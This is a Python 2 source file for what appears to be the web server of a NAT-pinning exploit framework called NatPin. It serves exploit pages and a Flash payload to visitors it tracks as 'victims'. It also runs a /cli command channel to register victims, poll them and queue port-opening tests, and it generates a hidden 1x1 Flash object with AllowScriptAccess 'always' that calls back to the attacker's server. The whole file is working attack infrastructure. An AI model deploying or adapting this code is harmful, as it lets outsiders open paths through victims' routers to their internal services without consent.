#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import time
from urllib import unquote
from datetime import datetime

class HTTPProtoHandler(asyncore.dispatcher_with_send):
	REQPAGE = ""
	REQHEADER = ""
	REQHEADERDONE = 0
	def __init__(self,conn_sock, client_address, server):
		self.REQHEADERDONE = 0
		self.REQHEADER = ""
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort),3)
	def get_header(self,req,header_name,splitter=":"):
		headers=req.split("\n")
		result = ""
		for header in headers:
			headerparts = header.split(splitter)
			if len(headerparts)>1:
				if headerparts[0].strip().upper()==header_name.upper():
					result = header.strip()
		return result
	def parseURLArgs(self,command):
		try:
			cmd_parts = command.split("&")
			params = {}
			for part in cmd_parts:
				item = part.split("=")
				param_name = item[0].strip().lower()
				if param_name !="ts":#ignore timestamp
					params[param_name]=item[1].strip()
					if params[param_name]!="":
						try:
							params[param_name] = unquote(params[param_name])
						except UnicodeDecodeError:
							self.server.log("Error in web.parseURLArgs: can't decode string " + params[param_name],2)
			return params
		except Exception, e:
				self.server.log("Error in web.parseURLArgs('"+command+"') : " + e.message,2)
				return {}
	def handle_cmd(self,command):
		"""Validates command structure, sends data for processing to engine (self.server.CALLER) and returns output to client"""
		cmd_parts = self.parseURLArgs(command)
		result=""
		if "cmd" in cmd_parts:
			cmd = cmd_parts['cmd'].upper().strip()
		else:
			cmd="NONE"	
		if cmd=="REG":
			if not "ip" in cmd_parts:	#ci=client ip
				self.server.log("Received invalid REG command : " + command,2)
			else:
				client_ip = cmd_parts['ip']
				if not self.server.CALLER.isValidIPv4(client_ip):
					self.server.log("Received invalid IP for REG command : " + command,2)
				else:
					client_id = self.server.CALLER.registerVictim(self,client_ip)
					return client_id
		elif cmd=="POLL":
			if not "ci" in cmd_parts:
				self.server.log("Received invalid POLL command : " + command,0)
			else:
				#part[2] is random identifier, tobe discarded
				client_id = cmd_parts['ci']
				client = self.server.CALLER.getVictimByVictimId(client_id)
				if client != None:
					client.LAST_SEEN= datetime.now()
					for test in client.TESTS:
						if test.STATUS=="NEW":
							result = test.getTestString()
							break
				else:
					self.server.log("Received POLL command for unknown client: " + command,4)
		elif cmd=="ADD":
			try:
				client_id = cmd_parts["ci"]
				proto = cmd_parts["proto"].upper()
				ip = cmd_parts["ip"]
				port = cmd_parts["port"]
			except KeyError:
				self.server.log("Received invalid ADD command : " + command,2)
				client_id=""
			client = self.server.CALLER.getVictimByVictimId(client_id)
			if client != None:
				client.LAST_SEEN= datetime.now()
				if proto in self.server.CALLER.PROTOS and self.server.CALLER.isValidIPv4(ip) and self.server.CALLER.isValidPort(port):						
					#distrust whatever comes from the web
					result = client.addTest(proto,ip,port)
				else:
					self.server.log("Received invalid ADD command : " + command,2)
			else:
				self.server.log("Received ADD command for unknown client:  " + command,4)
		elif  cmd=="STATUS":
			if not "testid" in cmd_parts:
				self.server.log("Received invalid STATUS command : " + command,2)
			else:
				test = self.server.CALLER.getVictimTest(cmd_parts["testid"])
				if test != None:
					result = test.STATUS + " " + str(test.RESULT)
				else:
					result = "0"
		elif cmd=="GENFLASH" or cmd=="GENFLASHIE":
			try:
				client_id=cmd_parts["ci"]
				server=cmd_parts["server"]
				result="""
<object id="flash" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="1" height="1">
	<param name="movie" value="exploit.swf">
	<param name="quality" value="high">
	<param name="AllowScriptAccess" value="always">
	<param name="bgcolor" value="FFFFFF">
	<param name="FlashVars" value="ci="""+str(client_id)+"""&amp;server="""+server.split(":")[0]+"""&amp;cmdURL=http://"""+server+"""/cli">
	<param name="wmode" value="window">
	<embed name="flash" src="exploit.swf" width="1" height="1" wmode="window" allowscriptaccess="always" bgcolor="FFFFFF" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" flashvars="ci="""+client_id+"""&amp;server="""+server.split(":")[0]+"""&amp;cmdURL=http://"""+server+"""/cli">
	</embed>
</object>
"""
			except KeyError:
				self.server.log("Received invalid GENFLASH command : " + command,2)
		elif cmd=="LIST":
			try:
				client_id = cmd_parts["ci"]
				client = self.server.CALLER.getVictimByVictimId(client_id)
				if client != None:
					for test in client.TESTS:
						result = result + test.TEST_ID + "|"  + test.STATUS + "|" + test.TEST_TYPE + "|" + str(test.RESULT) + "|" + test.PUBLIC_IP + "|" + test.PRIVATE_IP + "|" + test.PUBLIC_PORT + "|" + test.PRIVATE_PORT + "\n"
			except KeyError:
				self.server.log("Received invalid LIST command : " + command,2)
		if result=="": result="0"
		return result
	
	def handle_read(self):
		data = self.recv(1024)
		request = self.get_header(data,"GET", " ")
		_page = ""
		if request <>"":
			headerparts = request.split(" ")
			if headerparts[0]=="GET":
				_page = headerparts[1].replace("/","")
				if _page =="": _page = "admin.html"
				self.server.log("Victim requested page: " + _page,3)
		_page=_page.lower()
		page = _page.split("?")[0];
		if page != "":
			arrPages = ["admin.html","exploit.swf", "admin.css","admin.js","tools.js","screen.js","gremwell_logo.png","exploit.html","exploit.css","exploit.js"]
			arrCommands = ["cli"]
			if page in arrPages:
				agent = self.get_header(data,"USER-AGENT",":")
				self.server.log("---" + agent,4)
				if page =="exploit.swf":
					respheader="""HTTP/1.1 200 OK\r\nContent-Type: application/x-shockwave-flash; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
				else:
					respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
				f = open("exploit/"+page,"r")
				body = f.read()
				f.close()		
			elif page in arrCommands:
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
				body=""
				if page=="cli":
					if len(_page.split("?"))!=2:
						body ="Invalid command."
					else:
						body=self.handle_cmd(_page.split("?")[1].strip())
				else:
					body=""
			else:
				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nContent-Length: 0\r\n\r\n"""
				body = ""
			respheader = respheader.replace("$len$",str(len(body)))
			self.send(respheader + body)
			#self.send(body)
#end class

class Server(Base):
	def __init__(self,serverPort=843, caller=None):
		self.TYPE = "Web Server"
		Base.__init__(self,"TCP",serverPort,caller)
		self.log("Started",2)
	#end def
	def protocolhandler(self,conn, addr):
		# FLASH POLICY FILE SUPPORT
		self.HANDLER = HTTPProtoHandler(conn,addr,self)
	#end def
#end class
